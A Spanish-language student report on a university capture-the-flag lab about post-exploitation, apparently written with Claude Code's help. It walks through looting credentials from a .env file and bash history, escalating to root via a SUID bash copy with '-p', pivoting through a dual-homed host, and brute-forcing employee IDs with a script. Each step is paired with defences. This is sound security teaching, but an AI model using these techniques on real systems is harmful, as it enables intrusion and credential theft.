# Informe — Laboratorio 08 · Post-explotación y automatización

**Grupo:** 08 · **Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919 · **Fecha:** 30/10/2026

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Asistencia en la exploración del host víctima (`situational awareness`), análisis de notas de deploy y loot de credenciales de la Parte 1; borrador de la redacción de las secciones correspondientes de la tabla, evidencias 2.1 y 2.2, y respuesta P3. | `informe.md`: filas de Recon del host y Loot de la tabla, secciones 2.1 y 2.2, respuesta P3 y bitácora de la Parte 1. | Las salidas pegadas en la sección 2 corresponden a la terminal del host comprometido. Las flags capturadas se validaron contra el evaluador del laboratorio con `./ctf submit 08`. El grupo revisó técnicamente el contenido y comprende las implicancias operativas y defensivas del análisis. |
| Claude (Anthropic), vía Claude Code | Asistencia en la Parte 2: enumeración de binarios SUID y explotación (GTFOBins) del R3, y pivoting a la red interna segmentada del R4; borrador de la redacción de esas secciones, evidencias y preguntas de análisis. | `informe.md`: filas de Privesc y Pivoting de la tabla, secciones 2.3 y 2.4, respuestas P1, P2 y P5, y bloque de la Parte 2 en la bitácora; ampliación de `scripts/recon_loot.sh` con los pasos de R3/R4. | Las salidas pegadas corresponden a la ejecución real del entorno (`./ctf lab 08`, `docker exec`). Las flags `FLAG{privesc_suid_root}` y `FLAG{pivot_internal_host}` se validaron contra el evaluador con `./ctf submit 08 R3/R4` (progreso 4/5). El grupo revisó técnicamente el contenido y comprende las implicancias operativas y defensivas. |
| Claude (Anthropic), vía Claude Code | Asistencia en la Parte 3: implementación de la función `buscar_flag()` de `src/recolector.py` (enumeración de los 250 legajos del host interno) y ejecución del R5; borrador de la redacción de la sección de automatización y de P4. | `informe.md`: sección 3 (Automatización) y respuesta P4; función `buscar_flag()` de `src/recolector.py`. | La salida pegada en la sección 3 es la ejecución real del script contra el host interno. La flag `FLAG{automation_pays_off}` se validó contra el evaluador con `./ctf submit 08 R5`. El grupo revisó técnicamente el contenido y comprende la lógica del script y sus implicancias. |

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Flags capturadas

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████  5/5 (100%)
```

---

## 2. Informe de post-explotación

| Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
|---|---|---|---|---|
| Recon del host (R1) | Relevamiento de identidad y entorno (`situational awareness`), inspección del árbol de directorios administrativos en `/opt`. | `id`, `whoami`, `hostname`, `uname -a`, `env`, `ls -la /opt` y lectura con `cat /opt/phantom-deploy/DEPLOY_NOTES.txt`. | Usuario `operador` (uid=1000), hostname `phantomcorp`, entorno `DEPLOY_ENV=produccion`. Nota de despliegue con token activo: `FLAG{post_situational_awareness}`. | **Mínimo privilegio en filesystem y limpieza de artefactos**. No dejar notas de aprovisionamiento en hosts de producción; restringir permisos de lectura a directorios administrativos (`chmod 700 /opt/...`) accesibles únicamente por `root`. |
| Loot de credenciales (R2) | Búsqueda de secretos estáticos de aplicación en archivos de configuración (`.env`) y lectura del historial de comandos del usuario (`~/.bash_history`). | `cat /var/www/.env` y `cat /home/operador/.bash_history`. | Archivo `.env` exponiendo base de datos interna (`DB_HOST=phantomcorp-db`, `DB_USER=phantom_app`, contraseña `Ph@ntom-DB-2024`) y `APP_SECRET=FLAG{loot_credentials_found}`. El historial confirmó acceso previo a `http://phantomcorp-db/`. | **Gestión centralizada de secretos**. No guardar credenciales en archivos planos en el filesystem. Usar un gestor de secretos (HashiCorp Vault, AWS Secrets Manager) que inyecte secretos efímeros en memoria en tiempo de ejecución. Restringir permisos (`chmod 600`) y deshabilitar o sanitizar `HISTFILE`. |
| Privesc (SUID) (R3) | Enumeración de binarios con bit SUID y explotación de una copia SUID de `bash` (`system-check`) para obtener contexto de `root` y leer `/root/flag.txt`. | `find / -perm -4000 -type f 2>/dev/null` y `/usr/local/bin/system-check -p -c 'cat /root/flag.txt'` (técnica GTFOBins). | Binario no estándar `-rwsr-xr-x root root /usr/local/bin/system-check` (copia de bash). Con `-p` el shell mantiene `euid=0(root)` → lectura de `/root/flag.txt` = `FLAG{privesc_suid_root}`. | **Eliminar el SUID innecesario y endurecer el host**. Quitar el bit (`chmod u-s`), auditar periódicamente (`find / -perm -4000`), montar particiones con `nosuid`, y aplicar MAC (AppArmor/SELinux) para que ningún shell herede privilegios de root. |
| Pivoting (R4) | Uso del host comprometido como trampolín hacia la red interna segmentada (`internalnet`) para alcanzar `phantomcorp-db`, invisible desde la consola del atacante. | `ip -br a` (dos interfaces), `curl -s http://phantomcorp-db/` desde la víctima. Contraste: el mismo `curl` desde el atacante falla. | La víctima tiene doble interfaz (`eth0 192.168.97.3` labnet, `eth1 192.168.117.3` internalnet). El atacante (solo labnet) no tiene ruta al db; desde la víctima la respuesta trae `FLAG{pivot_internal_host}`. | **Microsegmentación y mínimo privilegio de red**. No conectar hosts expuestos a redes internas sensibles; aplicar firewall por host/NSG con reglas de egreso explícitas, VLANs separadas y políticas *zero-trust* que no asuman confianza por estar dentro de la LAN. |
| Automatización (R5) | Enumeración de los 250 legajos de `/empleado?id=N` del host interno con un script propio (`recolector.py`) que detecta el registro anómalo y corta al encontrarlo. | `python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250` (stdlib `urllib`). | El legajo `id=187` es una `cuenta-servicio` que, en vez del campo `area`, trae `legajo_oculto` con `FLAG{automation_pays_off}`. A mano (250 requests) era inviable; el script lo resuelve en segundos. | **Rate limiting y detección de enumeración**. La API debe limitar peticiones por origen, exigir autenticación y autorización por objeto (no servir cualquier `id`), y alertar ante accesos secuenciales masivos desde un host que no debería iterar legajos. |

### 2.1 R1 — Reconocimiento del host comprometido

Al obtener acceso inicial sobre el sistema víctima (`make shell-victima`), asumimos el control como el usuario sin privilegios `operador`.

El primer paso metodológico de post-explotación es responder **¿Quién soy?** y **¿Dónde estoy?** (*situational awareness*):

```
$ id
uid=1000(operador) gid=1000(operador) grupos=1000(operador)

$ whoami
operador

$ hostname
phantomcorp

$ uname -a
Linux phantomcorp 6.6.137+rpt-rpi-2712 #1 SMP PREEMPT Debian 1:6.6.137-1+rpt1 (2026-05-15) aarch64 GNU/Linux

$ env | grep -E 'DEPLOY|USER|SHELL'
DEPLOY_ENV=produccion
USER=operador
SHELL=/bin/bash
```

Con la identidad confirmada, procedemos a enumerar el sistema de archivos buscando directorios no estándar donde suelen depositarse scripts o configuraciones de infraestructura. Inspeccionamos `/opt`:

```
$ ls -la /opt
total 12
drwxr-xr-x 3 root root 4096 Oct 30 10:00 .
drwxr-xr-x 1 root root 4096 Oct 30 10:00 ..
drwxr-xr-x 2 root root 4096 Oct 30 10:00 phantom-deploy

$ ls -la /opt/phantom-deploy
total 12
drwxr-xr-x 2 root root 4096 Oct 30 10:00 .
drwxr-xr-x 3 root root 4096 Oct 30 10:00 ..
-rw-r--r-- 1 root root   91 Oct 30 10:00 DEPLOY_NOTES.txt
```

El archivo `DEPLOY_NOTES.txt` posee permisos de lectura para todos los usuarios (`chmod 644`). Lo leemos:

```
$ cat /opt/phantom-deploy/DEPLOY_NOTES.txt
PhantomCorp - notas de despliegue (NO borrar)
deploy_token=FLAG{post_situational_awareness}
```

El archivo revela una nota descuidada de aprovisionamiento con el token de despliegue y la flag `FLAG{post_situational_awareness}`.

### 2.2 R2 — Loot de credenciales

El objetivo de la fase de *Credential Access / Looting* es extraer contraseñas, tokens y claves de acceso que faciliten la escalada de privilegios o el movimiento lateral.

Las aplicaciones web habitualmente guardan configuraciones en `/var/www/`. Revisamos el directorio y encontramos un archivo `.env`:

```
$ ls -la /var/www
total 12
drwxr-xr-x 2 root root 4096 Oct 30 10:00 .
drwxr-xr-x 1 root root 4096 Oct 30 10:00 ..
-rw-r--r-- 1 root root  117 Oct 30 10:00 .env
```

El archivo es legible por cualquier usuario del sistema. Su contenido expone la configuración completa de conexión:

```
$ cat /var/www/.env
DB_HOST=phantomcorp-db
DB_USER=phantom_app
DB_PASS=Ph@ntom-DB-2024
APP_SECRET=FLAG{loot_credentials_found}
```

El `.env` revela:
- La existencia de un host interno en la red: `phantomcorp-db`.
- Credenciales de la base de datos: usuario `phantom_app` y contraseña `Ph@ntom-DB-2024`.
- El secreto de la aplicación con la flag `FLAG{loot_credentials_found}`.

Adicionalmente, un atacante siempre inspecciona los comandos previos ejecutados por los operadores del sistema leyendo el historial de bash:

```
$ cat /home/operador/.bash_history
ls -la
cat /var/www/.env
curl http://phantomcorp-db/
```

El historial confirma que el host `phantomcorp-db` es alcanzable vía HTTP desde este equipo (`curl http://phantomcorp-db/`), sirviendo como pista directa para la fase de pivoting.

### 2.3 R3 — Escalada de privilegios (SUID)

Seguimos la tercera pregunta de la post-explotación: **¿Qué puedo hacer?**. El objetivo es pasar del usuario sin privilegios `operador` a `root`. La vía clásica es un binario con el **bit SUID** activo, que se ejecuta con los permisos de su *dueño* (root) en lugar de los de quien lo invoca.

Enumeramos todos los binarios SUID del sistema:

```
$ id
uid=1000(operador) gid=1000(operador) groups=1000(operador)

$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/local/bin/system-check
```

Todos son binarios estándar del sistema **excepto uno**: `/usr/local/bin/system-check`. Lo inspeccionamos:

```
$ ls -la /usr/local/bin/system-check
-rwsr-xr-x 1 root root 1412096 Oct 30 13:26 /usr/local/bin/system-check
```

La `s` en los permisos del dueño (`-rwsr-xr-x`) confirma el bit SUID, y el dueño es `root`. El tamaño (~1.4 MB) delata que es una **copia de `/bin/bash`**. La flag objetivo solo la puede leer root:

```
$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
```

Según **GTFOBins**, un `bash` con SUID se explota invocándolo con el flag `-p`. Por defecto `bash` descarta el `euid` elevado por seguridad; `-p` (*privileged*) le indica que **conserve** el `euid` del dueño del binario (root). Así obtenemos ejecución como root:

```
$ /usr/local/bin/system-check -p -c 'id; cat /root/flag.txt'
uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)
FLAG{privesc_suid_root}
```

El `euid=0(root)` confirma la escalada. Con privilegios de root leemos el archivo restringido y obtenemos `FLAG{privesc_suid_root}`.

### 2.4 R4 — Pivoting al host interno

El `.env` (R2) y el `.bash_history` revelaron un host interno `phantomcorp-db`. Las redes internas están **segmentadas**: la consola del atacante vive en una red (`labnet`) que **no** tiene ruta hacia ese host. El servidor web comprometido, en cambio, está conectado a **ambas** redes y sirve de trampolín (*lateral movement*).

Primero verificamos que desde la consola del atacante el host interno es inalcanzable:

```
$ curl -s --max-time 5 http://phantomcorp-db/
[atacante] SIN RUTA al host interno
```

En la víctima inspeccionamos las interfaces de red, que explican el porqué:

```
$ ip -br a
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if26        UP             192.168.97.3/24
eth1@if27        UP             192.168.117.3/24
```

La víctima tiene **dos interfaces**: `eth0` (`192.168.97.3`, red del atacante / `labnet`) y `eth1` (`192.168.117.3`, red interna segmentada / `internalnet`). El atacante solo ve la primera; el host interno vive solo en la segunda. Por eso la víctima es el puente obligatorio.

Pivoteamos: desde la víctima alcanzamos el host interno vía HTTP:

```
$ curl -s http://phantomcorp-db/
{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}
```

La respuesta del servicio interno entrega `FLAG{pivot_internal_host}` y confirma el acceso a la red segmentada. El endpoint `/empleado?id=N` que aparece en este host es el punto de partida de la automatización (R5).

---

## 3. Automatización

El R5 pide encontrar, entre **250 legajos** del host interno (`/empleado?id=N`), el único que esconde un flag. A mano son 250 requests: inviable. La tarea se convierte en una **herramienta** completando `src/recolector.py`, que usa solo la biblioteca estándar (`urllib`) para poder correr dentro del host comprometido sin instalar nada.

La lógica que implementamos en `buscar_flag()`:

1. Recorre el rango `[desde, hasta]` y pide cada `/empleado?id=N` con la función `consultar_legajo()` (ya provista como referencia). Un `404` (legajo inexistente) se ignora.
2. Un legajo **normal** trae las claves `nombre` y `area`. El que esconde el flag **rompe ese molde**: en lugar de `area` trae otra clave cuyo valor empieza con `FLAG{`. En vez de hardcodear el nombre exacto de esa clave, el script recorre los campos del registro y se queda con cualquier valor string que luzca como una flag. Así funciona aunque la clave anómala cambie de nombre.
3. **Apenas** lo encuentra, devuelve `(id, flag)` y corta: no sigue iterando de gusto.

Ejecución real contra el host interno:

```
$ python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
[*] Enumerando legajos 1..250 en http://phantomcorp-db
[+] Flag en el legajo id=187: FLAG{automation_pays_off}
```

El registro anómalo, confirmado a mano:

```
$ curl -s http://phantomcorp-db/empleado?id=187
{"id": 187, "nombre": "cuenta-servicio", "legajo_oculto": "FLAG{automation_pays_off}"}
```

El legajo 187 no es una persona sino una `cuenta-servicio`, y en vez de `area` trae el campo `legajo_oculto` con `FLAG{automation_pays_off}`. Eso es exactamente lo que el script detecta sin saberlo de antemano.

> **El puente hacia el Lab 09.** Este script es automatización, no agente: *nosotros* definimos la lógica (qué rango, cómo detectar lo anómalo, cuándo cortar) y la máquina solo repite. Un agente del Lab 09 tomaría esas decisiones por su cuenta. Encadenando los labs anteriores, el pipeline completo sería: recon (Lab 05) → enumeración de la superficie web (Lab 06) → explotación del RCE/SQLi (Lab 07) → post-explotación: loot del `.env`, privesc por SUID, pivot al db y enumeración automatizada de legajos (este lab). Cada etapa alimenta a la siguiente; el agente orquestaría ese encadenamiento.

---

## 4. Preguntas de análisis

**P1 — SUID y el flag `-p`.**

Un binario **SUID** (*Set User ID*, bit `chmod u+s`) es peligroso porque se ejecuta siempre con los privilegios de su **dueño**, no con los de quien lo invoca. Cuando ese dueño es `root`, cualquier usuario sin privilegios que lo ejecute corre código con `euid=0`. Si el binario permite —directa o indirectamente— ejecutar comandos arbitrarios (un shell como `bash`, o utilidades como `find`, `vim`, `python`, `cp`, etc.), deja de ser una herramienta acotada y se convierte en una **ejecución de comandos como root**: eso es exactamente una escalada de privilegios. El catálogo GTFOBins documenta, binario por binario, cómo abusar de cada uno.

El flag `-p` (*privileged*) de `bash` es la clave del caso concreto (CWE-250 / CWE-269). Por defecto, por seguridad, cuando `bash` detecta que su `euid` (usuario efectivo) difiere de su `uid` (usuario real) —justo lo que provoca el SUID— **descarta** el `euid` elevado y vuelve al usuario real, neutralizando el privilegio. El flag `-p` le indica que **no** baje privilegios y **conserve** el `euid` del dueño del binario. Por eso `system-check -p` mantiene `euid=0(root)` y permite leer `/root/flag.txt`, mientras que sin `-p` el shell correría como `operador` y el `cat` fallaría con *Permission denied*.

**P2 — El pivoting (por qué el atacante no llegaba y vos sí).**

El pivoting (*movimiento lateral*) fue posible por la **topología de red segmentada**. El entorno tiene dos redes: `labnet` (donde vive la consola del atacante) e `internalnet` (una red marcada como `internal`, sin salida ni ruta desde afuera). El host interno `phantomcorp-db` está conectado **únicamente** a `internalnet`.

El atacante solo tiene interfaz en `labnet`, por lo que no existe ninguna ruta de red hacia `phantomcorp-db`: el `curl` desde la consola atacante falla por falta de ruta. El host comprometido `phantomcorp`, en cambio, es **dual-homed**: tiene una pata en `labnet` (`eth0 192.168.97.3`, por donde entró el atacante) y otra en `internalnet` (`eth1 192.168.117.3`, la misma red del db). Al tomar control de ese host, heredamos su conectividad a la red interna y lo usamos como **trampolín**: lanzamos las peticiones *desde* la víctima y así alcanzamos un host que desde Internet/`labnet` era literalmente inalcanzable. Ese es el patrón de muchas brechas reales: el equipo comprometido inicialmente es irrelevante; su valor está en la red interna que abre.

**P3 — Cómo evitar secretos en `.env`/`.bash_history`.**

El hallazgo de secretos en texto claro dentro de `/var/www/.env` y en `~/.bash_history` ilustra una de las fallas operativas más comunes en entornos de producción (CWE-312 / CWE-522). Para evitar que las credenciales queden expuestas ante cualquier proceso o usuario con acceso local, se deben aplicar las siguientes prácticas de desarrollo y DevSecOps:

1. **Gestión centralizada de secretos (Secret Managers) en lugar de archivos planos:**
   - En entornos de producción modernos no deben existir archivos `.env` en disco. Las aplicaciones deben consumir credenciales mediante un gestor de secretos centralizado (como HashiCorp Vault, AWS Secrets Manager, Google Cloud Secret Manager o Azure Key Vault).
   - En contenedores Docker / Kubernetes, los secretos deben inyectarse directamente en la memoria del proceso en tiempo de arranque (a través de variables de entorno montadas desde Kubernetes Secrets o secretos en memoria `tmpfs`), evitando que residan en el sistema de archivos persistente donde cualquier usuario local con permisos de lectura (`chmod 644`) pueda extraerlos.
2. **Protección y sanitización del historial de shell (`.bash_history`):**
   - **No escribir credenciales en la línea de comandos:** Parámetros como `-p<contraseña>` o tokens en llamadas `curl` quedan grabados en texto plano en el historial. Se deben usar archivos de configuración protegidos, variables de sesión temporales o prompts interactivos que no dejen rastro.
   - **Configuración de variables de shell:** Configurar `HISTCONTROL=ignorespace` (para que cualquier comando precedido por un espacio no se guarde en el historial) o deshabilitar directamente el guardado en sesiones automatizadas o de cuentas de servicio mediante `unset HISTFILE` o `export HISTFILESIZE=0`.
   - **Permisos estrictos:** En caso de mantenerse el historial para propósitos de auditoría, debe contar con permisos restrictivos (`chmod 600 ~/.bash_history`), y para auditoría forense formal debe utilizarse un mecanismo del kernel como `auditd` o telemetría eBPF, nunca un archivo de texto en el home del usuario que este mismo puede manipular o leer.
3. **Controles estáticos en el pipeline de desarrollo (CI/CD) y `.gitignore`:**
   - Asegurar que `.env`, `.env.local` y cualquier archivo con claves privadas estén incluidos en `.gitignore` desde el primer commit para impedir que lleguen al repositorio de código fuente.
   - Implementar hooks de pre-commit y escaneo automatizado en el pipeline de integración continua mediante herramientas de detección de secretos (como TruffleHog, Gitleaks o git-secrets), bloqueando cualquier commit o despliegue que contenga patrones de tokens, contraseñas o claves API.

**P4 — Qué decidiste vos que el script no decide solo.**

El script automatizó la **repetición** (250 requests), pero cada **decisión** la tomamos nosotros antes de correrlo; el script no las razona:

1. **Qué enumerar y en qué rango.** Decidimos atacar `/empleado?id=N` y que el espacio era `1..250`. Eso salió de interpretar la pista y la respuesta del host, no del script. Si el rango fuera otro, el script no se da cuenta solo.
2. **Cómo reconocer el objetivo.** Definimos el criterio de "registro anómalo": un legajo normal tiene `nombre` + `area`, y el que buscamos trae un valor con forma de flag en otro campo. El script no sabe qué es "interesante"; aplica la regla que le dimos. Esa heurística es nuestra.
3. **Cuándo parar.** Decidimos cortar al primer hallazgo en vez de barrer los 250 enteros (eficiencia y menos ruido). También fijamos el `timeout` y qué hacer ante un error o un 404 (ignorar y seguir).
4. **El encuadre ético/legal.** Correr esto solo contra el target de la cátedra, no contra un sistema ajeno, es una decisión humana que ninguna herramienta toma por nosotros.

Esto es justo lo que separa un **script** de un **agente** (Lab 09): el script ejecuta una lógica fija que ya pensamos; un agente tomaría varias de estas decisiones por su cuenta (qué endpoint probar, cómo reconocer lo valioso, cuándo frenar). Por eso un agente ofensivo es más potente y también más peligroso: hay decisiones —sobre todo el alcance y lo ético— que **no** deberían delegarse.

**P5 — Defensa para SUID y para pivoting.**

**Mitigación del privesc por SUID.** La raíz del problema es un binario con privilegios innecesarios (CWE-250: *Execution with Unnecessary Privileges*).
- **Inmediata:** quitar el bit SUID del binario ilegítimo (`chmod u-s /usr/local/bin/system-check`) y, directamente, no dejar copias de shells en el host. Ningún `bash`/`find`/`python` debería ser SUID-root.
- **Preventiva:** auditar periódicamente los binarios SUID (`find / -perm -4000 -type f`) e integrarlo al pipeline/monitoreo (p. ej. AIDE/Tripwire para detectar cambios en permisos). Montar las particiones de datos y temporales con la opción `nosuid` para que el kernel ignore el bit. Aplicar control de acceso obligatorio (AppArmor/SELinux) que confine a los procesos aunque escalen. Y aplicar mínimo privilegio: si un servicio necesita una capacidad puntual, usar *Linux capabilities* acotadas (`setcap`) en vez de SUID-root completo.

**Mitigación del pivoting.** La raíz es que un host expuesto tiene línea directa a una red interna sensible.
- **Microsegmentación / zero-trust de red:** no conectar un host expuesto a Internet directamente a la red de bases de datos. Interponer firewall por host (nftables/iptables) o *Network Security Groups* con reglas de **egreso explícitas**: el servidor web solo debería poder hablar con el puerto/servicio estrictamente necesario del db, nada más. Separar en VLANs/subredes distintas y no asumir confianza por estar "dentro" de la LAN.
- **Defensa en profundidad:** la base de datos debe exigir **autenticación fuerte** (no basta con alcanzarla por red), registrar y alertar sobre conexiones desde orígenes inesperados (el web no debería iterar 250 legajos), y aplicar *rate limiting* para frenar la enumeración automatizada del R5.

---

## 5. Bitácora de comandos

```bash
# ==============================================================================
# PARTE 1 · Reconocimiento del host y Loot de credenciales (R1 y R2)
# ==============================================================================

# Conexión al host comprometido como usuario 'operador'
make shell-victima

# 1. Situational awareness (R1)
id                                                  # uid=1000(operador) gid=1000(operador)
whoami                                              # operador
hostname                                            # phantomcorp
uname -a                                            # Linux phantomcorp ... aarch64 GNU/Linux
env | grep -E 'DEPLOY|USER|SHELL'                   # DEPLOY_ENV=produccion

# Búsqueda de artefactos en /opt
ls -la /opt
ls -la /opt/phantom-deploy
cat /opt/phantom-deploy/DEPLOY_NOTES.txt             # deploy_token=FLAG{post_situational_awareness}

# 2. Loot de credenciales (R2)
ls -la /var/www
cat /var/www/.env                                   # DB_HOST, DB_USER, DB_PASS, APP_SECRET=FLAG{loot_credentials_found}
cat /home/operador/.bash_history                    # curl http://phantomcorp-db/

# ==============================================================================
# PARTE 2 · Escalada de privilegios (R3) y Pivoting (R4)
# ==============================================================================

# 3. Escalada de privilegios por SUID (R3)
id                                                  # uid=1000(operador) — sin privilegios
find / -perm -4000 -type f 2>/dev/null              # binarios SUID -> /usr/local/bin/system-check (no estandar)
ls -la /usr/local/bin/system-check                  # -rwsr-xr-x root root (copia de bash)
cat /root/flag.txt                                  # Permission denied (aun como operador)
/usr/local/bin/system-check -p -c 'id; cat /root/flag.txt'   # euid=0(root) -> FLAG{privesc_suid_root}

# 4. Pivoting al host interno (R4)
# (contraste) desde la consola del atacante NO hay ruta al host interno:
#   make shell ; curl -s --max-time 5 http://phantomcorp-db/   -> SIN RUTA
ip -br a                                             # eth0 192.168.97.3 (labnet) + eth1 192.168.117.3 (internalnet)
curl -s http://phantomcorp-db/                      # pivot OK -> FLAG{pivot_internal_host}

# ==============================================================================
# PARTE 3 · Automatización (R5)
# ==============================================================================

# 5. Enumeración automatizada de legajos con el script propio (desde la victima)
python3 src/recolector.py --base http://phantomcorp-db --desde 1 --hasta 250   # -> id=187 FLAG{automation_pays_off}
curl -s http://phantomcorp-db/empleado?id=187        # confirma el registro anomalo (cuenta-servicio / legajo_oculto)

# ==============================================================================
# Validación de flags capturadas desde la raíz del repositorio
# ==============================================================================
./ctf submit 08 R1 'FLAG{post_situational_awareness}'
./ctf submit 08 R2 'FLAG{loot_credentials_found}'
./ctf submit 08 R3 'FLAG{privesc_suid_root}'
./ctf submit 08 R4 'FLAG{pivot_internal_host}'
./ctf submit 08 R5 'FLAG{automation_pays_off}'
./ctf status 08                                     # Progreso: 5/5 (100%)
```
